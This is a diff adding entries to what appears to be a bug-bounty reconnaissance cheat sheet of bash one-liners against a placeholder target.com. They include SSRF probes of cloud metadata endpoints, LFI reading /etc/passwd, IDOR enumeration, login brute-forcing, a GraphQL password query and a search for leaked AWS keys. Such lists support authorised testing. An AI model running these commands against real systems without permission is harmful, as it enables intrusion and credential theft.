@@ -2731,3 +2731,105 @@ Find Kubernetes Dashboard Exposures
 cat subdomains.txt | httpx -silent -path /api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/ -mc 200 -o k8s_dashboard_exposed.txt
 ```
 
+Here is the converted content:
+
+Exposed Swagger / API Documentation  
+```bash
+curl -s https://target.com/swagger.json
+```
+
+Admin Panel Discovery (CMS Detection)  
+```bash
+curl -s https://target.com/admin/ | grep -i 'cms'
+```
+
+GCP Metadata SSRF Check  
+```bash
+curl "https://target.com/?url=http://metadata.google.internal/computeMetadata/v1/ -H 'Metadata-Flavor: Google'"
+```
+
+Azure Metadata Leak via SSRF  
+```bash
+curl "https://target.com/?url=http://169.254.169.254/metadata/instance?api-version=2021-01-01" -H "Metadata: true"
+```
+
+OAuth Token Leak in Referrer  
+```bash
+curl -I https://target.com/oauth/callback?code=abcd1234
+```
+
+AWS Keys Hunt in Public Repos (with GitHub CLI)  
+```bash
+gh search code "AWS_ACCESS_KEY_ID" --language python --limit 100
+```
+
+IDOR via Incrementing Document IDs  
+```bash
+for id in $(seq 1 100); do curl -s https://target.com/documents/$id; done
+```
+
+Sensitive Backup File Discovery  
+```bash
+curl -I https://target.com/config.bak
+```
+
+JWT Key Disclosure via Well-Known File  
+```bash
+curl -s https://target.com/.well-known/jwks.json
+```
+
+Mobile Deep Link Misconfig Check  
+```bash
+adb shell am start -a android.intent.action.VIEW -d "target://app/link?param=test"
+```
+
+Testing Rate Limiting (Brute Force)  
+```bash
+seq 1 1000 | xargs -P10 -I{} curl -X POST "https://target.com/api/login" -d 'user=admin&password=wrong{}'
+```
+
+Client-Side Security Headers Audit  
+```bash
+curl -I https://target.com | grep -Ei 'strict-transport|content-security|x-frame'
+```
+
+Session Fixation Check  
+Reuse session after login/logout:  
+```bash
+curl -c cookies.txt https://target.com/login && curl -b cookies.txt https://target.com/dashboard
+```
+
+Exposed Debug Endpoints  
+```bash
+curl -s https://target.com/debug/vars
+```
+
+Direct Database Query via GraphQL  
+```bash
+curl -X POST https://target.com/graphql -d '{"query":"{users{username,password}}"}'
+```
+
+DNS Zone Transfer Misconfig (AXFR)  
+```bash
+dig axfr target.com @ns1.target.com
+```
+
+Misconfigured CNAME Takeover  
+```bash
+dig cname subdomain.target.com
+```
+
+LFI via Parameter Tampering  
+```bash
+curl "https://target.com/page?file=../../../../etc/passwd"
+```
+
+WebSocket Security Check (Frame Injection)  
+```bash
+wscat -c ws://target.com/socket
+```
+
+Sensitive Parameter Brute Force  
+```bash
+cat params.txt | xargs -I{} curl -s "https://target.com/?{}=test"
+```
